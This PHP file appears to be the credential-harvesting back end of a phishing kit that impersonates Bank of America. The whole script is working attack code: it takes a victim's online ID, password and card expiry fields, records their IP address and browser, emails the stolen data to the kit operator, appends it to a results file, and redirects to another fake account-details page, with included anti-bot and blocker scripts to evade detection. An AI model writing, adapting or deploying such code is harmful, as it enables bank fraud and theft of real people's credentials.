<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--------------  BOA LOGIN  -------------\n";
$message .= "Onlineid : ".$_POST['callID']."\n";
$message .= "Password : ".$_POST['PsID']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By Dr.Don  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "BOA BAN3 LOGGN [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);

header("Location: ../challengevdl.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>